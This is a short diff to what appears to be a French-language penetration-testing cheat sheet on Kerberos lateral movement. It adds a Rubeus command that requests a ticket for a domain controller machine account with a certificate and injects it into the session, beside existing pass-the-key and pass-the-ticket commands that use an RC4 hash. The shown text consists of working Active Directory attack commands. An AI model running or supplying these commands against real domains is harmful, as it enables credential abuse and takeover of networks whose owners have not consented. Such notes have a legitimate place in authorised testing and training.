@@ -76,6 +76,8 @@ Utiliser les tickets pour réaliser des mouvements latéraux.
 # Sans ticket préalable : 
 # réalise à la fois le PassTheKey et le Pass The Ticket
 Rubeus.exe asktgt /domain:domain.local /user:MYUSER /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
+
 
 # Importation depuis un ticket.kirbi
 Rubeus.exe ptt /ticket:ticket.kirbi
